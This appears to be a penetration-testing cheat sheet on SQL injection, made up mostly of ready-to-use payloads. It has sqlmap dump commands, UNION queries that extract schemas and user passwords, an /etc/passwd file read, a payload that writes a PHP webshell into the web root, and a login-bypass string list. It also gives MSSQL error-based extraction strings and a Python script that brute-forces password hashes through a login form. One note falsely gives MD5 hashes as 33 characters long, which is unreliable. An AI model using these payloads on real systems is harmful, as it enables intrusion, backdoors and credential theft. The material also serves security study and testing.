---
description: >-
  SQLi is a common web application vulnerability that is caused by unsanitized
  user input being inserted into SQL queries.
---

# SQL Injection

## Automatization with sqlmap

```
# Post
sqlmap -r request.txt -p username

# Get
sqlmap -u "http://example.com/index.php?id=1" -p id

# Crawl
sqlmap -u http://example.com --dbms=mysql --crawl=3
```

{% hint style="info" %}
**Note:** `request.txt` is a request saved in BurpSuite.
{% endhint %}

### Dumping a Table

```
sqlmap -r request.txt -p username -D database_name -T table_name --dump
```

## Union Attack

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database.

MySQL syntax for the example:

```
$sql = "SELECT id, name, text FROM example WHERE id=" . $_GET['id'];
```

### Column Number Enumeration

After detect that the application is vulnerable to SQLi we need to know how many columns are queried. To do that task we are going to use order by to guess the number of columns retrieved. The idea is to increment the number until get an error.

```
/index.php?id=1 order by 1
/index.php?id=1 order by 2
/index.php?id=1 order by 3
/index.php?id=1 order by 4 - ERROR
```

### Output Layout

Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.

```
/index.php?id=1 union all select 1, 2, 3
```

### Extracting Data from Database

Now knowing that the third column is for descriptions, we can put there all information.

```
/index.php?id=1 union all select 1, 2, @@version
/index.php?id=1 union all select 1, 2, user()
/index.php?id=1 union all select 1, 2, table_name from information_schema.tables
/index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
/index.php?id=1 union all select 1, username, passwords from users
```

### Read files

Some databases allows us to read or write files in the filesystem.

```
/index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
```

### From SQLi to RCE

Since we are allowed to upload files, we can upload a webshell to the web root.

```
/index.php?id=1 union all select 1, 2, "<?php system($_GET['cmd']);?>" into OUTFILE '/var/www/html/backdoor.php'
```

In case of exploiting a **Microsoft SQL Server** check this:

{% content-ref url="../services/1433-microsoft-sql-server.md" %}
[1433-microsoft-sql-server.md](../services/1433-microsoft-sql-server.md)
{% endcontent-ref %}

## Login Bypass

The most classic ones:

```
' or '1'='1
' or 1=1-- -
' or 1=1# 
```

Then others:

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

### Knowing the username

When we are aware of some username we can impersonate him with SQLi by introducing the username and commenting the rest of the SQL Query.

```
administrator'-- -
administrator'# 
```

## Error Based SQLi

Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs.

_Example of Microsoft SQL Server:_

```
1', CONVERT(int,SELECT ...... FROM ....)

a',convert(int,(SELECT CURRENT_USER)))--
a',convert(int,(SELECT DB_NAME(0))))--
a',convert(int,(SELECT DB_NAME(1))))--

# SELECT FIRST TABLE
a',convert(int,(SELECT TOP 1 name from DATABASE..sysobjects where xtype='U')))--

# SELECT A N TABLE (OFFSET)
a',convert(int,(SELECT name from DATABASE..sysobjects where xtype='U' ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY )))--

# SELECT A N COLUMN NAME(OFFSET) of TABLE
a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM DATABASE..sysobjects WHERE name = 'TABLE') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--

# DUMP - repeat it modifyng the OFFSET to retrieve all table entries
a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
```

## Blind SQLi

A SQLi is blind because we don't have access to the error log or any type of output which difficult a lot the process of exploitation.

### Time Based

Since we are not aware about any type of error or output we can use sleeps.

```
1-sleep(4)
```

If it loads for four seconds extra we know that the database is processing our `sleep()` command.

### Dump tables

It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field.

```
import requests
chars = "0123456789abcdef"
def GetSQL(i,c):
    return "admin' and substr(password,%s,1) = '%s' -- -" % (i,c)
for i in range(1,33):
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection,'password':"randompassword"}
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        if 'Wrong identification' in r.text:
            print(c,end='',flush=True)
            break
print()
```

{% hint style="info" %}
**Note:** MD5 hash are hexadecimal with 33 character length.
{% endhint %}

{% embed url="https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md" %}

## References

* [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
* [https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
